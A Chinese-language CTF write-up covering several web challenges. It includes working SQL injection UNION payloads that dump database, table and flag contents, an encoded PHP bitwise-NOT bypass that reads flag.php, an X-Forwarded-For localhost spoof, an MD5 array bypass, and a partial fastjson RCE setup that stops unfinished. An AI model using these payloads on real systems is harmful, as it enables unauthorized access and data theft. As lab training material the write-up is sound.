## 本地管理员

![image-20250613213425741](assets/image-20250613213425741.png)

![image-20250613213507835](assets/image-20250613213507835.png)

源码中有个base64的注释

![image-20250613214228719](assets/image-20250613214228719.png)

test123，试试账号admin密码test123

![image-20250613214318961](assets/image-20250613214318961.png)

![image-20250613214717198](assets/image-20250613214717198.png)

ip不能访问，添加X-Forwarded-For:127.0.0.1，获得flag

![image-20250613214754391](assets/image-20250613214754391.png)

>`X-Forwarded-For` 用于标识客户端（例如浏览器）的IP地址。在某些环境下，因为客户端通过了多个代理服务器来访问服务器，所以服务器不能直接获得客户端的真实IP地址，而只能获取到代理服务器的IP地址。
>
>X-Forwarded-For: <client>, <proxy1>, <proxy2>
>
>其中，*<client>* 是客户端的 IP 地址，*<proxy1>* 和 *<proxy2>* 分别是经过的每个代理服务器的 IP 地址。最左边的 IP 地址是原始客户端的 IP 地址，最右边的 IP 地址是最近的代理服务器的 IP 地址

## 成绩查询

![image-20250613215630656](assets/image-20250613215630656.png)

![image-20250613215711250](assets/image-20250613215711250.png)

输入1有回显，1‘回显异常，1’#回显正常，判断是sql字符型注入

order by判断列数，当```1' order by 5 # '   ```时回显异常，字段数为4

爆库```-1' union select 1,2,3,database()#```

![image-20250613221050390](assets/image-20250613221050390.png)



爆表```-1' union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema='skctf'#```

![image-20250613221128682](assets/image-20250613221128682.png)

暴字段

```-1' union select 1,2,3,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='fl4g'#```

![image-20250613221213306](assets/image-20250613221213306.png)

获得字段内容

```-1' union select 1,2,3,group_concat(skctf_flag) from fl4g#```

![image-20250613221250734](assets/image-20250613221250734.png)

## 犯人留下了信息

![image-20250613222950911](assets/image-20250613222950911.png)

两张图片

![image-20250613223023573](assets/image-20250613223023573.png)

仔细看着两张图片

![image-20250613223856906](assets/image-20250613223856906.png)

![image-20250613223900707](assets/image-20250613223900707.png)

两张图片有不同之处，好像是盲水印

```git clone https://github.com/linyacool/blind-watermark.git```下载项目

```python2 decode.py --original 1.png --image 2.png --result 3.png```

![image-20250613225013160](assets/image-20250613225013160.png)

## hate_php

![image-20250613231846132](assets/image-20250613231846132.png)

![image-20250613231934572](assets/image-20250613231934572.png)



过滤了字符：`f l a g . p h / ; " ' \` | [ ] _ =`

过滤了所有 PHP 内置函数名

为了绕过取两次反

将`~'highlight_file'`和`~'flag.php'`用url编码后再取反

```/?code=(~%97%96%98%97%93%96%98%97%8B%A0%99%96%93%9A)(~%99%93%9E%98%D1%8F%97%8F)```

![image-20250613232450540](assets/image-20250613232450540.png)





## random

![image-20250614102123044](assets/image-20250614102123044.png)

![image-20250614102143533](assets/image-20250614102143533.png)

发送的数字通过get请求发送

![image-20250614102255852](assets/image-20250614102255852.png)

题目叫守株待兔。将num随便取个值，然后对请求进行不断重放得到flag

![image-20250614102526564](assets/image-20250614102526564.png)

## weakphp

![image-20250614102651768](assets/image-20250614102651768.png)



![image-20250614102722645](assets/image-20250614102722645.png)

对网址进行扫描发现存在git目录

使用githack进行还原

![image-20250614103209398](assets/image-20250614103209398.png)

```php
<?php
require_once "flag.php";
if (!isset($_GET['user']) && !isset($_GET['pass'])) {
    header("Location: index.php?user=1&pass=2");
}

$user = $_GET['user'];
$pass = $_GET['pass'];
if ((md5($user) == md5($pass)) and ($user != $pass)){
    echo $flag;
} else {
    echo "nonono!";
}
?>

```

需要user和pass不相等但是md5值相等

用数组绕过，user[]=1&pass[]=2

![image-20250614103357214](assets/image-20250614103357214.png)

## fastjson 1.2.24-rce

用了dnslog

![image-20250614003234425](assets/image-20250614003234425.png)



![image-20250614003513006](assets/image-20250614003513006.png)

javac编译得到TouchFile.class

启动一个http服务

```bash
python -m http.server 2266
```

![image-20250614004027937](assets/image-20250614004027937.png)

安装java1.8版本

下载编译 marshalsec然后一直报错





